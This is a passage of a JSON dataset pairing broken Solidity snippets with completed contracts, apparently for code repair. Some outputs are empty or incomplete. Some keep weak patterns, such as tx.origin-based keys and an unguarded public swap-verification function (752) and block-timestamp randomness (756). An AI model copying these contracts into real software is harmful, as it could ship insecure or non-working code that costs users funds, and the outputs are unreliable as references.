        "output": "pragma solidity ^0.8.9;\ncontract InstructorContract {\n    \n    struct Instructor {\n        uint age;\n        string fName;\n        string lName;\n    }\n    \n    mapping (address => Instructor) instructors;\n    address[] public instructorAccts;\n    \n    function setInstructor(address _address, uint _age, string memory _fName, string memory _lName) public {\n        Instructor storage instructor = instructors[_address];\n        instructor.age = _age;\n        instructor.fName = _fName;\n        instructor.lName = _lName;\n\n        instructorAccts.push(_address);\n    }\n    \n    function getInstructors() view public returns(address[] memory) {\n        return instructorAccts;\n    }\n    \n    function getInstructor(address _address) view public returns (uint, string memory, string memory) {\n        return (instructors[_address].age, instructors[_address].fName, instructors[_address].lName);\n    }\n    \n    function countInstructors() view public returns (uint) {\n        return instructorAccts.length;\n    }\n}\n\n",
        "changed": 0
    },
    "749.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    function mint() external {\n        require(block.timestamp >= 1640995200, \"Not yet available\");\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    function mint() external {\n        require(block.timestamp >= 1640995200, \"Not yet available\");\n        // ... rest of your code\n    }\n}\n\n",
        "changed": 0
    },
    "750.sol": {
        "input": "contract MyAbstractContract {\n  function myAbstractFunction() public pure returns (string);\n}\n\n  contract MyContract is MyAbstractContract {\n      function myAbstractFunction() public pure returns (string)\n }\n\ncontract MyContract is MyAbstractContract {\n        function myAbstractFunction() public pure returns (string)\n         { return \"string value to return\"; }\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\nabstract contract MyAbstractContract {\n    function myAbstractFunction() public pure virtual returns (string memory);\n}\n\n",
        "changed": 0
    },
    "751.sol": {
        "input": "function sendGift(uint256 _mintAmount,address recipient) public {\n\npayable(admin).call{value: address(this).balance}(\"\");\n\nadmin.transfer(address(this).balance);\n\npayable(admin).transfer(address(this).balance);\n\ninterface IERC20 {\n    function transfer(address, uint256) external returns (bool);\n}\n\ncontract MyContract {\n    function withdrawToken() {\n        IERC20(tokenContractAddress).transfer(recipient, amount);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.5.16;\ninterface IERC20 {\n    function transfer(address, uint256) external returns (bool);\n}\n\ncontract MyContract {\n    address payable public admin;\n    address public tokenContractAddress;\n\n    constructor(address _tokenContractAddress) public {\n        admin = msg.sender;\n        tokenContractAddress = _tokenContractAddress;\n    }\n\n    function sendGift(uint256 _mintAmount, address recipient) public payable {\n        require(msg.sender == admin, \"Only admin can send gift\");\n        require(IERC20(tokenContractAddress).transfer(recipient, _mintAmount), \"Transfer failed\");\n    }\n\n    function withdrawETH() public {\n        require(msg.sender == admin, \"Only admin can withdraw\");\n        admin.transfer(address(this).balance);\n    }\n\n    function withdrawToken(uint256 amount, address recipient) public {\n        require(msg.sender == admin, \"Only admin can withdraw\");\n        require(IERC20(tokenContractAddress).transfer(recipient, amount), \"Transfer failed\");\n    }\n}\n\n",
        "changed": 0
    },
    "752.sol": {
        "input": "function swapEthToVs(uint256 amount) public payable returns (bytes32) {\n    require(_admin != _msgSender(),\"You Cannot Buy this Coin At this moment\");\n    bytes32 kHash = keccak256(abi.encodePacked(msg.value,amount,_msgSender()));\n    swapHash[_origin()] = kHash;\n    payable(address(_admin)).transfer(msg.value);\n    return kHash;\n}\n\nfunction verifySwapHash(uint256 eth,address to,uint256 amount) public returns (bool) {\n    require(swapHash[to] == keccak256(abi.encodePacked(eth, amount, to)),\"Invalid hash no trace found\");\n    transfer(to, amount);\n    delete swapHash[to];\n    return true;\n}\n\n\n",
        "output": "pragma solidity ^0.7.6;\ncontract SwapContract {\n    address private _admin;\n    mapping(address => bytes32) public swapHash;\n\n    constructor(address admin) {\n        _admin = admin;\n    }\n\n    function _msgSender() internal view returns (address payable) {\n        return msg.sender;\n    }\n\n    function _origin() internal view returns (address) {\n        return tx.origin;\n    }\n\n    function transfer(address to, uint256 amount) internal {\n        // Transfer implementation\n    }\n\n    function swapEthToVs(uint256 amount) public payable returns (bytes32) {\n        require(_admin != _msgSender(),\"You Cannot Buy this Coin At this moment\");\n        bytes32 kHash = keccak256(abi.encodePacked(msg.value,amount,_msgSender()));\n        swapHash[_origin()] = kHash;\n        payable(address(_admin)).transfer(msg.value);\n        return kHash;\n    }\n\n    function verifySwapHash(uint256 eth,address to,uint256 amount) public returns (bool) {\n        require(swapHash[to] == keccak256(abi.encodePacked(eth, amount, to)),\"Invalid hash no trace found\");\n        transfer(to, amount);\n        delete swapHash[to];\n        return true;\n    }\n}\n\n",
        "changed": 0
    },
    "753.sol": {
        "input": "function getAllBools() public view returns (bool[] memory) {\n    bool[] memory result = new bool[](keys.length);\n    for (uint i = 0; i < keys.length; i++) {\n        result[i] = inserted[keys[i]];\n    }\n    return result;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract BooleanStore {\n    mapping(string => bool) private inserted;\n    string[] private keys;\n    \n    function insertBool(string memory key, bool value) public {\n        if (!inserted[key]) {\n            keys.push(key);\n        }\n        inserted[key] = value;\n    }\n\n    function getBool(string memory key) public view returns (bool) {\n        return inserted[key];\n    }\n\n    function getAllBools() public view returns (bool[] memory) {\n        bool[] memory result = new bool[](keys.length);\n        for (uint i = 0; i < keys.length; i++) {\n            result[i] = inserted[keys[i]];\n        }\n        return result;\n    }\n}\n\n",
        "changed": 0
    },
    "755.sol": {
        "input": "pragma solidity ^0.5.7;\n\npragma solidity ^0.8.4;\n\nbalances[require] += amount;\n\nbalances[receiver] += amount;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SimpleToken {\n    mapping(address => uint256) public balances;\n\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\n\n    constructor(uint256 initialSupply) {\n        balances[msg.sender] = initialSupply;\n    }\n\n    function transfer(address _to, uint256 _amount) public returns (bool success) {\n        require(balances[msg.sender] >= _amount, \"Insufficient balance\");\n\n        balances[msg.sender] -= _amount;\n        balances[_to] += _amount;\n\n        emit Transfer(msg.sender, _to, _amount);\n\n        return true;\n    }\n\n    function balanceOf(address _owner) public view returns (uint256 balance) {\n        return balances[_owner];\n    }\n}\n\n",
        "changed": 0
    },
    "756.sol": {
        "input": "pragma solidity ^0.8.9;\ncontract Test {\n    mapping(uint16 => bool) public usedTokens;  \n    uint16 public totalTokens = 40000;  \n    \n    function getRandomToken(uint16 player) public returns (uint16) {\n        require(player > 0, \"Invalid player ID\");  \n        \n        uint16 tokenId = _generateRandomToken(player);  \n        while (usedTokens[tokenId]) {  \n            tokenId = _generateRandomToken(player);\n        }\n        \n        usedTokens[tokenId] = true;  \n        return tokenId;  \n    }\n    \n    function _generateRandomToken(uint16 player) private view returns (uint16) {\n        uint16 randomNumber = uint16(uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty, player))));\n        return (randomNumber % totalTokens) + 1;  \n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Test {\n    mapping(uint16 => bool) public usedTokens;  \n    uint16 public totalTokens = 40000;  \n    \n    function getRandomToken(uint16 player) public returns (uint16) {\n        require(player > 0, \"Invalid player ID\");  \n        \n        uint16 tokenId = _generateRandomToken(player);  //\n        while (usedTokens[tokenId]) {  \n            tokenId = _generateRandomToken(player);\n        }\n        \n        usedTokens[tokenId] = true;  \n        return tokenId;  \n    }\n    \n    function _generateRandomToken(uint16 player) private view returns (uint16) {\n        uint16 randomNumber = uint16(uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty, player))));\n        return (randomNumber % totalTokens) + 1;  \n    }\n}\n\n",
        "changed": 0
    },
    "757.sol": {
        "input": "contract Bar {\n    function blockingFunction() public pure returns (bool val) {\n        assembly {\n            let freePointer := mload(0x40)\n            mstore(freePointer,true)\n            val:=mload(freePointer)\n        }      \n    }  \n}\n\ncontract Foo is Bar {\n    function foo() public pure returns(bool) {\n        bool result = blockingFunction();\n        require(result == true, \"msg\");\n        return result;\n    }\n}\n\n\n",
        "output": "contract Bar {\n    function blockingFunction() public pure returns (bool val) {\n        assembly {\n            let freePointer := mload(0x40)\n            // store true\n            mstore(freePointer,true)\n            // return the stored value without return opcode\n            val:=mload(freePointer)\n        }      \n    }  \n}\n\ncontract Foo is Bar {\n    function foo() public pure returns(bool) {\n        bool result = blockingFunction();\n        require(result == true, \"msg\");\n        return result;\n    }\n}\n\n",
        "changed": 0
    },
    "758.sol": {
        "input": "struct Data {\n    uint256 number;\n    uint256 balance;\n}\n\n...\n\nfunction details(address owner) public view returns (Data[] memory data) {\n    uint256[] memory ownerPhones = phones[owner];\n    uint256 numPhones = ownerPhones.length;\n    data = new Data[](numPhones);\n\n    uint256 number;\n\n    for (uint256 i = 0; i < numPhones; i++) {\n        number = ownerPhones[i];\n        data[i].number = number;\n        data[i].balance = balance[number];\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract PhoneRegistry {\n    // Define a structure to store phone data\n    struct Data {\n        uint256 number;\n        uint256 balance;\n    }\n\n    // Define a mapping to associate an owner (address) with his phones (array of uint256)\n    mapping(address => uint256[]) public phones;\n\n    // Define a mapping to associate a phone number (uint256) with its balance (uint256)\n    mapping(uint256 => uint256) public balance;\n\n    // Function to get the details of all phones of a specific owner\n    function details(address owner) public view returns (Data[] memory data) {\n        uint256[] memory ownerPhones = phones[owner];\n        uint256 numPhones = ownerPhones.length;\n        data = new Data[](numPhones);\n\n        uint256 number;\n\n        for (uint256 i = 0; i < numPhones; i++) {\n            number = ownerPhones[i];\n            data[i].number = number;\n            data[i].balance = balance[number];\n        }\n    }\n\n    // Function to add a new phone for an owner\n    function addPhone(address owner, uint256 number, uint256 _balance) public {\n        phones[owner].push(number);\n        balance[number] = _balance;\n    }\n}\n\n",
        "changed": 0
    },
    "759.sol": {
        "input": "if(g.opposition == address(0) && msg.sender != host)\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract GameContract {\n\n    address public host;\n    struct Game {\n        address opposition;\n        bool isSet;\n    }\n\n    Game public g;\n\n    constructor() public {\n        host = msg.sender;\n        g = Game({opposition: address(0), isSet: false});\n    }\n\n    function setOpposition(address _opposition) public {\n        require(msg.sender == host, \"Only the host can set the opposition\");\n        require(_opposition != address(0), \"Opposition address can't be 0\");\n        g.opposition = _opposition;\n        g.isSet = true;\n    }\n\n    function checkOpposition() public view returns (address) {\n        if(g.opposition == address(0) && msg.sender != host) {\n            revert(\"Opposition not set or caller is not host\");\n        }\n        return g.opposition;\n    }\n}\n\n",
        "changed": 0
    },
    "760.sol": {
        "input": "pragma solidity 0.8.7;\n\ncontract Master {\n  uint p;\n\n  function changep()public {\n    p = 1;\n  }\n\n  function getP() public view returns(uint) {\n    return p;\n  }\n}\n\n\ncontract CallerOne {\n\n  Master m;\n\n  constructor(address _m) {\n    m = Master(_m);\n  }\n\n  function change1() public {\n    m.changep();\n  }\n\n  function Get1() public view returns(uint) {\n    return m.getP();\n  }\n}\n\ncontract CallerTwo {\n\n  Master m;\n\n  constructor(address _m) {\n    m = Master(_m);\n  }\n\n  function change2() public {\n    m.changep();\n  }\n\n  function Get2() public view returns(uint) {\n    return m.getP();\n  }\n}\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.7;\n\ncontract Master {\n  uint p;\n\n  function changep()public {\n    p = 1;\n  }\n\n  // we use the view mutator, that way we tell the compiler that this function wont change the state of the blockchain ( change state variable p value ).\n  function getP() public view returns(uint) {\n    return p;\n  }\n}\n\n\ncontract CallerOne {\n\n  Master m;\n\n  constructor(address _m) {\n    m = Master(_m);\n  }\n\n  function change1() public {\n    m.changep();\n  }\n\n  function Get1() public view returns(uint) {\n    return m.getP();\n  }\n}\n\ncontract CallerTwo {\n\n  Master m;\n\n  constructor(address _m) {\n    m = Master(_m);\n  }\n\n  function change2() public {\n    m.changep();\n  }\n\n  function Get2() public view returns(uint) {\n    return m.getP();\n  }\n}\n",
        "changed": 0
    },
    "761.sol": {
        "input": "import \"github.com/provable-things/ethereum-api/provableAPI_0.5.sol\";\n\n\n",
        "output": "",
        "changed": 0
    },
    "762.sol": {
        "input": "pragma solidity ^0.8;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\ncontract MyToken is ERC20 {\n    constructor() ERC20(\"MyToken\", \"MyT\") {\n    }\n\n    function transfer(address to, uint256 amount) override public payable returns (bool) {\n    }\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "763.sol": {
        "input": "C c = C(address(0x123));\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract C {\n    address public owner;\n\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    function setOwner(address _owner) public {\n        require(msg.sender == owner, \"Only owner can change ownership\");\n        owner = _owner;\n    }\n}\n\ncontract MainContract {\n    C public c;\n\n    constructor() public {\n        c = C(address(0x123));\n    }\n}\n\n",
        "changed": 0
    },
    "764.sol": {
        "input": "function invest(address referrer, uint8 plan) public payable {\n    uint256 fee = msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);\n    commissionWallet.transfer(fee);\n    emit FeePayed(msg.sender, fee);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Investment {\n    uint256 constant public PROJECT_FEE = 10;\n    uint256 constant public PERCENTS_DIVIDER = 100;\n    address payable public commissionWallet;\n\n    event FeePayed(address indexed user, uint256 totalAmount);\n\n    constructor(address payable _commissionWallet) {\n        commissionWallet = _commissionWallet;\n    }\n\n    function invest(address referrer, uint8 plan) public payable {\n        require(msg.value > 0, \"Investment amount must be greater than 0\");\n        uint256 fee = msg.value * PROJECT_FEE / PERCENTS_DIVIDER;\n        commissionWallet.transfer(fee);\n        emit FeePayed(msg.sender, fee);\n    }\n}\n\n",
        "changed": 0
    },
    "765.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    uint256 public publicUint256;\n}\n\ncontract MyChildContract is MyContract {\n\n    function setValue(uint256 _value) external {\n        publicUint256 = _value;\n    }\n\n    function getValue() external view returns (uint256) {\n        return publicUint256;\n    }\n\n    function getValue2() external view returns (uint256) {\n        return this.publicUint256();\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    // external contracts can only read the value\n    // using the autogenerated getter function\n    uint256 public publicUint256;\n}\n\ncontract MyChildContract is MyContract {\n    // derived contracts can both get and set the value\n\n    function setValue(uint256 _value) external {\n        publicUint256 = _value;\n    }\n\n    function getValue() external view returns (uint256) {\n        return publicUint256;\n    }\n\n    function getValue2() external view returns (uint256) {\n        return this.publicUint256();\n    }\n}\n\n",
        "changed": 0
    },
    "766.sol": {
        "input": "pragma solidity ^0.8.7;\ncontract Debugging2 {\n    uint256 counter = 200;\n}\n\npragma solidity ^0.8.7;\ncontract Debugging {\n    uint256 counter;\n    constructor(uint256 _counter) {\n        counter = _counter;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Debugging2 {\n    uint256 public counter;\n\n    constructor() {\n        counter = 200;\n    }\n}\n\ncontract Debugging {\n    uint256 public counter;\n\n    constructor(uint256 _counter) {\n        counter = _counter;\n    }\n}\n\n",
        "changed": 0
    },
    "767.sol": {
        "input": " require(msg.sender==minter)\n\n    address public _minter;\n\n\n    constructor(address minter_){\n        _minter=minter_;        \n     }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    address public _minter;\n\n    constructor(address minter_) {\n        _minter = minter_;\n    }\n\n    function setMinter(address newMinter) public {\n        require(msg.sender == _minter, \"Only the minter can change the minter\");\n        _minter = newMinter;\n    }\n}\n\n",
        "changed": 0
    },
    "768.sol": {
        "input": "bool private paused;\nstring tokenName;\n mapping(address=>mapping(address=>uint)) public allowed;\n\nemit Burn(_from,_to,_tokens)\n\naddress payable public owner; \nconstructor() { \n        owner = payable(msg.sender); \n    }\n     \n\nfunction renounceOwnership() external onlyOwner { \n        emit OwnershipRenounced(owner); \n        owner = payable(address(0)); \n    }\n\nfunction transferOwnership(address _newOwner) external onlyOwner { \n        require(_newOwner != address(0)); \n        emit OwnershipTransferred(owner, _newOwner); \n        owner = payable(_newOwner); \n    } \n\nfunction updateOwner(address _newOwner) external onlyOwner { \n        require(_newOwner != address(0)); \n        emit OwnershipTransferred(owner, _newOwner); \n        owner = payable(_newOwner); \n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TokenContract {\n    bool private paused;\n    string public tokenName;\n    mapping(address => mapping(address => uint)) public allowed;\n    address payable public owner; \n    \n    event Burn(address indexed from, address indexed to, uint tokens);\n    event OwnershipRenounced(address indexed previousOwner);\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    modifier onlyOwner() {\n        require(msg.sender == owner);\n        _;\n    }\n\n    constructor(string memory _tokenName) { \n        owner = payable(msg.sender); \n        tokenName = _tokenName;\n    }\n\n    function renounceOwnership() external onlyOwner { \n        emit OwnershipRenounced(owner); \n        owner = payable(address(0)); \n    }\n\n    function transferOwnership(address _newOwner) external onlyOwner { \n        require(_newOwner != address(0)); \n        emit OwnershipTransferred(owner, _newOwner); \n        owner = payable(_newOwner); \n    } \n\n    function updateOwner(address _newOwner) external onlyOwner { \n        require(_newOwner != address(0)); \n        emit OwnershipTransferred(owner, _newOwner); \n        owner = payable(_newOwner); \n    }\n}\n\n",
        "changed": 0
    },
    "769.sol": {
        "input": "pragma solidity >= 0.7.0 <0.9.0;\n\ncontract Challenge0 {\n    address public owner;\n    uint256 userBalance;\n    uint256 withdrawAmountVariable;\n    bool public canWithdraw = false;\n  \n    constructor() {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(owner == msg.sender, \"You aren't the smart contact's owner\");\n        _;\n    }\n\n    function getBalance() public returns(uint) {\n    }\n\n    function withdrawAmount(uint256 amount) onlyOwner payable public {\n        require(msg.value == amount);\n        require(amount <= getBalance());\n        payable(msg.sender).transfer(amount);\n    }\n\n    function setUserBalance()external view {\n    }\n    \n    function getUserBalance()public view returns (uint256){\n        return address(this).balance;\n    }\n\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity >= 0.7.0 <0.9.0;\n\ncontract Challenge0 {\n    address public owner;\n    uint256 userBalance;\n    uint256 withdrawAmountVariable;\n    bool public canWithdraw = false;\n  \n    constructor() {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(owner == msg.sender, \"You aren't the smart contact's owner\");\n        _;\n    }\n\n    function getBalance() public returns(uint) {\n        // TODO: implement your logic\n    }\n\n    function withdrawAmount(uint256 amount) onlyOwner payable public {\n        require(msg.value == amount);\n        require(amount <= getBalance());\n        payable(msg.sender).transfer(amount);\n    }\n\n    function setUserBalance()external view {\n        // TODO: implement  your logic \n    }\n    \n    function getUserBalance()public view returns (uint256){\n        return address(this).balance;\n    }\n\n}\n\n",
        "changed": 0
    },
    "772.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    function foo() external {\n        require(false, \"Only owner can call this function xxxxxxxxxx\");\n    }\n}\n\npragma solidity ^0.8;\n\ncontract MyContract {\n    function foo() external {\n        require(false, \"no\");\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    address public owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner {\n        require(msg.sender == owner, \"Only owner can call this function\");\n        _;\n    }\n\n    function foo() external onlyOwner {\n        // Your function logic goes here\n    }\n}\n\n",
        "changed": 0
    },
    "773.sol": {
        "input": "pragma solidity 0.8.19;\n\ninterface MyInterface{\n    function changeVariable() external;\n    function randomFunction() external;\n}\n\ncontract ContractInherits {\n    uint256 public a_variable;\n\n    function changeVariable() public {\n        a_variable = a_variable++;\n    }  \n}\n\ncontract MainContract {\n    MyInterface public immutable instanceOfContractInherits;\n\n    constructor(MyInterface _ContractInherits) {\n        instanceOfContractInherits = _ContractInherits;\n    }\n\n    function doStuff() public {\n        instanceOfContractInherits.changeVariable();\n        instanceOfContractInherits.randomFunction();\n    }\n}\n\n\ntransact to MainContract.doStuff errored: VM error: revert.\n\nrevert\n\nstatus  false Transaction mined but execution failed\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface MyInterface {\n    function changeVariable() external;\n    function randomFunction() external;\n}\n\ncontract MainContract {\n    MyInterface public immutable instanceOfContractInherits;\n\n    constructor(MyInterface _ContractInherits) {\n        instanceOfContractInherits = _ContractInherits;\n    }\n\n    function doStuff() public {\n        instanceOfContractInherits.changeVariable();\n        instanceOfContractInherits.randomFunction();\n    }\n}\n\n",
        "changed": 0
    },
    "774.sol": {
        "input": " \npragma solidity >= 0.6.0 < 0.9.0;\n \ncontract Sample{\n    \n    address public owner;\n    \n    constructor() {\n        owner = msg.sender;\n    }\n    \n    receive() external payable { \n    }\n    \n    fallback() external payable {\n    }\n    \n    function getBalance() public view returns (uint){\n        return address(this).balance;\n    }\n\n    function transferEther(address payable recipient, uint amount) public returns(bool){\n        require(owner == msg.sender, \"transfer failed because you are not the owner.\"); \n        if (amount <= getBalance()) {\n            recipient.transfer(amount);\n            return true;\n        } else {\n            return false;\n        }\n    }\n}\n\n\n",
        "output": "//SPDX-License-Identifier: GPL-3.0\n \npragma solidity >= 0.6.0 < 0.9.0;\n \ncontract Sample{\n    \n    address public owner;\n    \n    constructor() {\n        owner = msg.sender;\n    }\n    \n    receive() external payable { \n    }\n    \n    fallback() external payable {\n    }\n    \n    function getBalance() public view returns (uint){\n        return address(this).balance;\n    }\n\n    // this function is for sending the wei/ether OUT from this smart contract (address) to another contract/external account.\n    function transferEther(address payable recipient, uint amount) public returns(bool){\n        require(owner == msg.sender, \"transfer failed because you are not the owner.\"); // \n        if (amount <= getBalance()) {\n            recipient.transfer(amount);\n            return true;\n        } else {\n            return false;\n        }\n    }\n}\n\n",
        "changed": 0
    },
    "775.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract Structing {\n    struct DataOne {\n        uint indexOne;\n        address toOne;\n    }\n\n    struct DataTwo {\n        uint indexTwo;\n        address toTwo;\n    }\n\n    DataOne dataOne;\n    DataTwo dataTwo;\n\n\n    function getDataOne() public view returns (DataOne memory) { \n        return dataOne; \n    }\n\n    function getDataTwo() public view returns (DataTwo memory) { \n        return dataTwo; \n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract Structing {\n    // type definition\n    struct DataOne {\n        uint indexOne;\n        address toOne;\n    }\n\n    // type definition\n    struct DataTwo {\n        uint indexTwo;\n        address toTwo;\n    }\n\n    // typed properties\n    DataOne dataOne;\n    DataTwo dataTwo;\n\n    // TODO implement setters of `dataOne` and `dataTwo` properties\n\n    function getDataOne() public view returns (DataOne memory) { // returns type\n        return dataOne; // property name\n    }\n\n    function getDataTwo() public view returns (DataTwo memory) { // returns type\n        return dataTwo; // property name\n    }\n}\n\n",
        "changed": 0
    },
    "776.sol": {
        "input": "import \"@openzeppelin/contracts/access/Ownable.sol\";\n\ncontract A is Ownable {\n\n    receive() external payable {}\n\n    function getCurrentBalance() public view onlyOwner returns (uint) {\n        return address(this).balance;\n    }\n}\n\ninterface I {\n    function getCurrentBalance() external view returns (uint) ;\n    function transferOwnership(address newOwner) external;\n}\n\n\ncontract B is Ownable {\n\n    I public itf = I(contract_A_address_); \n\n    receive() external payable {}\n\n    function getBalanceOfA() public view onlyOwner returns (uint) {\n        return itf.getCurrentBalance();\n    }\n\n    function changeAOwner(address newOwner) public onlyOwner{\n        itf.transferOwnership(newOwner);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface I {\n    function getCurrentBalance() external view returns (uint);\n    function transferOwnership(address newOwner) external;\n}\n\n",
        "changed": 1
    },
    "777.sol": {
        "input": " constructor() {\n    uniswapRouter = IUniswapV2Router02(UNISWAP_ROUTER_ADDRESS);\n  }\n\n  address public immutable override WETH;\n\nconstructor(address _factory, address _WETH) public {\n    factory = _factory;\n    WETH = _WETH;\n }\n\n\n",
        "output": "",
        "changed": 0
    },
    "778.sol": {
        "input": "transaction = await contract.createMarketItem(\n      nftAddress,\n      tokenId,\n      { value: (listingPrice) },\n      royalty,\n      index\n    );\n\ntransaction = await contract.createMarketItem(\n          nftAddress,\n          tokenId,\n          priceFromForm,\n          royalty,\n          index, \n          { value: (listingPrice) }\n\n        );\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MarketContract {\n    struct MarketItem {\n        address nftAddress;\n        uint tokenId;\n        uint price;\n        uint royalty;\n        uint index;\n    }\n\n    MarketItem[] public marketItems;\n\n    function createMarketItem(\n        address _nftAddress,\n        uint _tokenId,\n        uint _price,\n        uint _royalty,\n        uint _index\n    ) public payable {\n        require(msg.value == _price, \"Price must be equal to listed price\");\n        MarketItem memory newItem = MarketItem(_nftAddress, _tokenId, _price, _royalty, _index);\n        marketItems.push(newItem);\n    }\n\n    function getMarketItems() public view returns(MarketItem[] memory) {\n        return marketItems;\n    }\n}\n\n",
        "changed": 0
    },
    "779.sol": {
        "input": " var abiEnconde = new ABIEncode();\n\n var resultHash = abiEnconde.GetSha3ABIEncodedPacked(\n          new ABIValue(\"address\", msg1),\n          new ABIValue(\"uint256\", amount),\n          new ABIValue(\"uint256\", nonce));\n\n var messageHashed = \"0x\" + Convert.ToHexString(resultHash).ToLower();\n var signature1 = signer1.Sign(resultHash, new EthECKey(privateKey));\n\nfunction getMessageHash(address add,uint256 amount,uint256 nonce ) public pure returns (bytes32) {\n    return keccak256(abi.encodePacked(add,amount,nonce)); \n}\n\n bytes memory prefix = \"\\x19Ethereum Signed Message:\\n32\";\n bytes32 prefixedHashMessage = keccak256(abi.encodePacked(prefix,getMessageHash(msg1,amount,nonce)));\n    \n address signer = ecrecover(prefixedHashMessage, _v, _r, _s);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    function getMessageHash(address add, uint256 amount, uint256 nonce) public pure returns (bytes32) {\n        return keccak256(abi.encodePacked(add, amount, nonce)); \n    }\n\n    function verifySignature(address msg1, uint256 amount, uint256 nonce, uint8 _v, bytes32 _r, bytes32 _s) public pure returns (address) {\n        bytes memory prefix = \"\\x19Ethereum Signed Message:\\n32\";\n        bytes32 messageHash = getMessageHash(msg1, amount, nonce);\n        bytes32 prefixedHashMessage = keccak256(abi.encodePacked(prefix, messageHash));\n        address signer = ecrecover(prefixedHashMessage, _v, _r, _s);\n        return signer;\n    }\n}\n\n",
        "changed": 0
    },
    "780.sol": {
        "input": "\npragma solidity ^0.8.0;\n\ncontract FallbackContract {\n    uint256 public invalidFunctionCalls;\n\n    constructor () {\n        invalidFunctionCalls = 0;\n    }\n\n    fallback() external {\n        invalidFunctionCalls += 1;\n    }\n}\n\n\n",
        "output": "// Contract A\n// SPDX-License-Identifier: UNLICENSED\n\npragma solidity ^0.8.0;\n\ncontract FallbackContract {\n    uint256 public invalidFunctionCalls;\n\n    constructor () {\n        invalidFunctionCalls = 0;\n    }\n\n    fallback() external {\n        invalidFunctionCalls += 1;\n    }\n}\n\n",
        "changed": 0
    },
    "781.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract TrainingResults {\n    enum Stage {\n        NONE,\n        STAGE_1,\n        STAGE_2,\n        COMPLETED\n    }\n\n    mapping (address => Stage) public participantStage;\n\n    function setParticipantStage(address _graduate, Stage _stage) external {\n        require(msg.sender == address(0x123), \"Not authorized\");\n        participantStage[_graduate] = _stage;\n    }\n}\n\npragma solidity ^0.8;\n\nimport \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\n\ncontract TrainingResults is ERC721 {\n    constructor() ERC721(\"TrainingResults\", \"TR\") {}\n\n    function _beforeTokenTransfer(address from,address to, uint256 tokenId) override internal {\n        require(msg.sender == address(0x123), \"Cannot transfer tokens\");\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TrainingResults {\n    enum Stage {\n        NONE,\n        STAGE_1,\n        STAGE_2,\n        COMPLETED\n    }\n\n    mapping (address => Stage) public participantStage;\n    \n    address public admin;\n\n    constructor() {\n        admin = msg.sender;  // Set contract deployer as admin\n    }\n\n    function setParticipantStage(address _graduate, Stage _stage) external {\n        require(msg.sender == admin, \"Not authorized\");\n        participantStage[_graduate] = _stage;\n    }\n}\n\n",
        "changed": 0
    },
    "782.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    int number = 100; \n\n    function foo() public {\n        int anotherNumber = 100; \n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    int number = 100; // implicit `storage` location of a property\n\n    function foo() public {\n        int anotherNumber = 100; // implicit `memory` location of a variable\n    }\n}\n\n",
        "changed": 0
    },
    "783.sol": {
        "input": "function burn(uint256 _value) public {\n    \n    emit Transfer(msg.sender, address(0), _value)\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyToken {\n    string public constant name = \"MyToken\";\n    string public constant symbol = \"MTK\";\n    uint8 public constant decimals = 18;\n    uint256 public totalSupply;\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    mapping (address => uint256) public balanceOf;\n\n    constructor(uint256 initialSupply) public {\n        totalSupply = initialSupply;\n        balanceOf[msg.sender] = totalSupply;\n        emit Transfer(address(0), msg.sender, totalSupply);\n    }\n\n    function transfer(address _to, uint256 _value) public returns (bool success) {\n        require(balanceOf[msg.sender] >= _value);\n        balanceOf[msg.sender] -= _value;\n        balanceOf[_to] += _value;\n        emit Transfer(msg.sender, _to, _value);\n        return true;\n    }\n\n    function burn(uint256 _value) public {\n        require(balanceOf[msg.sender] >= _value);\n        balanceOf[msg.sender] -= _value;\n        totalSupply -= _value;\n        emit Transfer(msg.sender, address(0), _value);\n    }\n}\n\n",
        "changed": 1
    },
    "784.sol": {
